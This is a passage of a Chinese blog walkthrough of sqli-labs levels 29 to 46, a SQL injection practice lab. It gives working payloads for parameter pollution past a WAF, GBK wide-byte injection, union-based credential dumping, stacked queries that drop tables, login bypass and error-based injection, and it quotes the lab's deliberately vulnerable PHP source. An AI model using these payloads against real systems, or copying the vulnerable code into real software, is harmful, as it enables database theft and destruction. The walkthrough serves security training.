<span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">java_implimentation() 方法</span><br><span class="line"></span><br><span class="line">该方法将 <span class="keyword">GET</span> 读入的整行参数使用 explode() 方法对 “<span class="operator">&amp;</span>” 进行分割，返回一个分割后的数组。接着方法通过 substr() 方法提取对 “<span class="operator">&amp;</span>” 分割后的第一个元素的前 <span class="number">2</span> 个字符，若这 <span class="number">2</span> 个字符是 “id”，则再次使用 substr() 方法提取等号后面的值返回。注意该方法提取的是 <span class="number">2</span> 个同名变量中的第一个，因此它无法对第二个同名变量进行操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>WAF implimentation <span class="keyword">with</span> a whitelist approach..... <span class="keyword">only</span> allows input <span class="keyword">to</span> be Numeric.</span><br><span class="line"><span class="keyword">function</span> whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">      $<span class="keyword">match</span> <span class="operator">=</span> preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">      if($<span class="keyword">match</span>)</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;you are good&quot;;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span><span class="keyword">return</span> $<span class="keyword">match</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">            header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;you are bad&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">whitelist() 方法</span><br><span class="line"></span><br><span class="line">该方法使用正则表达式判断传入的参数是否是数字，若不是数字则跳转页面。由于注入 <span class="number">2</span> 个同名参数时，java_implimentation() 方法返回的参数是第一个 id 参数，此时这个过滤就被我们绕过了</span><br></pre></td></tr></table></figure><h3 id="30关：”-闭合，有WAF-高效过滤"><a href="#30关：”-闭合，有WAF-高效过滤" class="headerlink" title="30关：” 闭合，有WAF　高效过滤"></a><strong>30关：” 闭合，有WAF　高效过滤</strong></h3><p>使用参数污染</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span>&quot; order by 3-- -　／／查字段数</span><br><span class="line">往下和29关一样</span><br></pre></td></tr></table></figure><h3 id="31关：”-闭合，有WAF"><a href="#31关：”-闭合，有WAF" class="headerlink" title="31关：”) 闭合，有WAF"></a><strong>31关：”) 闭合，有WAF</strong></h3><p>使用参数污染，用第二个参数进行注入，同30关</p><h3 id="32关：单引号闭合，单引号参数被转义"><a href="#32关：单引号闭合，单引号参数被转义" class="headerlink" title="32关：单引号闭合，单引号参数被转义"></a><strong>32关：单引号闭合，单引号参数被转义</strong></h3><p>使用宽字节注入</p><p>当数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; //宽字节注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">返回</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1�\&#x27;&#x27; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line">这种操作是由于 GBK 国标码是双字节表示一个汉字，因此导致了反斜杠和其他的字符共同表示为一个汉字。这可以让数据库的 <span class="keyword">SQL</span> 查询了正确的参数(汉字)，从而可以使用 <span class="keyword">UNION</span> 语句进行注入</span><br></pre></td></tr></table></figure><p>开始注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; order by 3-- - //查字段数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">-- - //查显示位</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,@@version,database()-- - //查版本与当前数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata),database()<span class="comment">-- - //查所有数据库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479),3-- - //查表名注意此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>),<span class="number">3</span><span class="comment">-- - //查字段，同样要使用hex</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,(select group_concat(0x7e,id,0x2e,username,0x2e,password)from security.users),3-- - //查数据</span></span><br></pre></td></tr></table></figure><p>可以看到 id 参数传入时，会先经过 check_addslashes() 函数，该函数起到的作用应该就是转义字符了。注意网页会把数据库的编码改成 GBK，给宽字节注入提供了可能性</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">$id <span class="operator">=</span> check_addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span><br><span class="line"> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> connectivity </span><br><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"> </span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">      echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check_addslashes() 函数</span><br><span class="line"></span><br><span class="line">该函数使用正则表达式匹配字符，将 <span class="string">&#x27; 转义为 &#x27;</span> ， 将 \ 转义为 \ ，将 &quot; 转义为 &quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, &quot;\\\\\\&quot;, $string);      <span class="operator">/</span><span class="operator">/</span>把\\变成斜体，再使用\\\\\\去替换</span><br><span class="line">      backslash</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/\&#x27;</span><span class="operator">/</span>i<span class="string">&#x27;, &#x27;</span>\\\<span class="string">&#x27;&#x27;</span>, $string);                           <span class="operator">/</span><span class="operator">/</span><span class="keyword">escape</span> single quote <span class="keyword">with</span> a backslash</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, &quot;\\\&quot;&quot;, $string);                            //escape double quote with a backslash</span><br><span class="line"> </span><br><span class="line">      return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preg_replace() 搜索第3参数中匹配第1参数的部分，以第2参数进行替换</span><br><span class="line"></span><br><span class="line">preg_quote() 需要参数 str 并向其中 每个正则表达式语法中的字符前增加一个反斜线。 这通常用于你有一些运行时字符串 需要作为正则表达式进行匹配的时候。</span><br><span class="line">正则表达式特殊字符有： . \ + * ? [ ^ ] $ ( ) &#123; &#125; = ! &lt; &gt; | : -</span><br></pre></td></tr></table></figure><h3 id="33关：与32一模一样"><a href="#33关：与32一模一样" class="headerlink" title="33关：与32一模一样"></a><strong>33关：与32一模一样</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">      $string <span class="operator">=</span> addslashes($string);    </span><br><span class="line">      <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_addslashes() 函数</span><br><span class="line"></span><br><span class="line">此处的过滤函数是 addslashes() 函数，用于在预定义字符之前添加反斜杠，预定字符有单引号、双引号和反斜杠</span><br></pre></td></tr></table></figure><h3 id="34关：POST-‘-闭合-宽字节注入"><a href="#34关：POST-‘-闭合-宽字节注入" class="headerlink" title="34关：POST  ‘ 闭合 宽字节注入"></a><strong>34关：POST  ‘ 闭合 宽字节注入</strong></h3><p>要通过 BP 操作 payload 就行了，和32关一样</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE71.png">    </p><h3 id="35关：数字型注入"><a href="#35关：数字型注入" class="headerlink" title="35关：数字型注入"></a><strong>35关：数字型注入</strong></h3><p>判断闭合，以下方式均闭合失败。可能是数字型注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&#x27;</span>)<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;)-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1 and 1=1-- -正常</span></span><br><span class="line"><span class="string">?id=1 and 1=2-- -异常</span></span><br><span class="line"><span class="string">验证了它为数字型</span></span><br><span class="line"><span class="string">由于数值型注入不涉及任何编码问题，因此任何转义操作都形同虚设</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1 union select 1,2,3-- - //查显示位</span></span><br><span class="line"><span class="string">和第一关一样</span></span><br></pre></td></tr></table></figure><h3 id="36关：’-闭合-宽字节注入"><a href="#36关：’-闭合-宽字节注入" class="headerlink" title="36关：’ 闭合 宽字节注入"></a><strong>36关：’ 闭合 宽字节注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">-- - //查显示位</span></span><br><span class="line">下面的payload 与<span class="number">32</span>关一样</span><br></pre></td></tr></table></figure><h3 id="37关：POST-‘-闭合-宽字节注入"><a href="#37关：POST-‘-闭合-宽字节注入" class="headerlink" title="37关：POST   ‘ 闭合 宽字节注入"></a><strong>37关：POST   ‘ 闭合 宽字节注入</strong></h3><p>和34关完全一样</p><h3 id="38关：’-闭合-堆叠注入’"><a href="#38关：’-闭合-堆叠注入’" class="headerlink" title="38关：’ 闭合 堆叠注入’"></a><strong>38关：’ 闭合 堆叠注入’</strong></h3><p>所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句,这是毁灭性的漏洞，骇客可以肆意操作数据库。这一关可以使用第一关的 payload 过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;CREATE TABLE a LIKE users;--+ //创建一张和users 一样的表</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> a <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;<span class="comment">--+ //将user里的数据插入a表中</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;DELETE FROM a;--+//删除a表中的数据</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> a;<span class="comment">--+//删除a表</span></span><br></pre></td></tr></table></figure><p>可以看到源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line">if (mysqli_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">&#123;    </span><br><span class="line">      <span class="comment">/* store first result set */</span></span><br><span class="line">      if ($<span class="keyword">result</span> <span class="operator">=</span> mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            if($<span class="type">row</span> <span class="operator">=</span> mysqli_fetch_row($<span class="keyword">result</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                  echo <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;</span><br><span class="line">                  printf(&quot;Your Username is : %s&quot;, $<span class="type">row</span>[<span class="number">1</span>]);</span><br><span class="line">                  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                  printf(&quot;Your Password is : %s&quot;, $<span class="type">row</span>[<span class="number">2</span>]);</span><br><span class="line">                  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>mysqli_free_result($<span class="keyword">result</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* print divider */</span></span><br><span class="line">      if (mysqli_more_results($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>printf(&quot;-----------------\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>while (mysqli_next_result($con1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysqli_error($con1));</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="39关：数字型-堆叠注入"><a href="#39关：数字型-堆叠注入" class="headerlink" title="39关：数字型 堆叠注入"></a><strong>39关：数字型 堆叠注入</strong></h3><p>参考38关</p><h3 id="40关：’-闭合-堆叠注入"><a href="#40关：’-闭合-堆叠注入" class="headerlink" title="40关：’) 闭合 堆叠注入"></a><strong>40关：’) 闭合 堆叠注入</strong></h3><p>参考38关</p><h3 id="41关：数字型-堆叠注入"><a href="#41关：数字型-堆叠注入" class="headerlink" title="41关：数字型  堆叠注入"></a><strong>41关：数字型  堆叠注入</strong></h3><p>参考38关</p><h3 id="42关：POST-密码处-‘-闭合-二次注入，堆叠注入"><a href="#42关：POST-密码处-‘-闭合-二次注入，堆叠注入" class="headerlink" title="42关：POST 密码处 ‘ 闭合  二次注入，堆叠注入"></a><strong>42关：POST 密码处 ‘ 闭合  二次注入，堆叠注入</strong></h3><p>页面和24关的二次注入一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">用户处使用万能密码，失败</span><br><span class="line"><span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>#</span><br><span class="line">a<span class="string">&#x27; OR 1 = 1#</span></span><br><span class="line"><span class="string">a&#x27;</span>) <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>#</span><br><span class="line">a<span class="string">&#x27;)) OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot; OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot;) OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot;)) OR 1 = 1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">密码处使用万能密码，成功，说明用户处存在过滤</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"></span><br><span class="line">然后开始堆叠注入  参考<span class="number">38</span>关</span><br><span class="line">a<span class="string">&#x27; or 1 = 1;CREATE TABLE a LIKE users;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> a <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;#</span><br><span class="line"></span><br><span class="line">a<span class="string">&#x27; or 1 = 1;DELETE FROM a;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> a;#</span><br></pre></td></tr></table></figure><p>username 字段使用 mysqli_real_escape_string() 函数进行转义，而 password 字段没有任何防御措施</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$username <span class="operator">=</span> mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">$password <span class="operator">=</span> $_POST[&quot;login_password&quot;];</span><br><span class="line"> </span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">if (<span class="variable">@mysqli</span>_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">/* store first result set */</span></span><br><span class="line">      if($<span class="keyword">result</span> <span class="operator">=</span> <span class="variable">@mysqli</span>_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            if($<span class="type">row</span> <span class="operator">=</span> <span class="variable">@mysqli</span>_fetch_row($<span class="keyword">result</span>))</span><br><span class="line">    &#123;</span><br><span class="line">          if ($<span class="type">row</span>[<span class="number">1</span>])</span><br><span class="line">          &#123;</span><br><span class="line">                <span class="keyword">return</span> $<span class="type">row</span>[<span class="number">1</span>];</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysqli_error($con1));</span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysqli_error($con1));</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="43关：用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入"><a href="#43关：用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入" class="headerlink" title="43关：用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入"></a><strong>43关：用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入</strong></h3><p>参考42关 和 38关</p><h3 id="44关：同43关，密码处-‘-闭合-二次注入，堆叠注入"><a href="#44关：同43关，密码处-‘-闭合-二次注入，堆叠注入" class="headerlink" title="44关：同43关，密码处 ‘ 闭合 二次注入，堆叠注入"></a><strong>44关：同43关，密码处 ‘ 闭合 二次注入，堆叠注入</strong></h3><h3 id="45关：同43关，用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入"><a href="#45关：同43关，用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入" class="headerlink" title="45关：同43关，用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入"></a><strong>45关：同43关，用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入</strong></h3><h3 id="46关：显示表单-数字型-报错注入"><a href="#46关：显示表单-数字型-报错注入" class="headerlink" title="**46关：显示表单 数字型 报错注入 **"></a>**46关：显示表单 数字型 报错注入 **</h3><p>页面提示 <strong>“请输入参数为带有数值的 sort”</strong></p><p>所以我们将 之前一直使用的  id 换为 sort .返回一张表格</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE70.png">    </p><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">此处是数字型注入，因为以下的闭合方式均失败</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">?sort=1&#x27;</span>)<span class="comment">--+</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;))--+</span></span><br><span class="line"><span class="string">?sort=1&quot;--+</span></span><br><span class="line"><span class="string">?sort=1&quot;)--+</span></span><br><span class="line"><span class="string">?sort=1&quot;))--+</span></span><br></pre></td></tr></table></figure><p>开始注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;~&quot;,database()),<span class="number">3</span>)<span class="comment">-- -//当前数据库名</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;~&quot;,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span 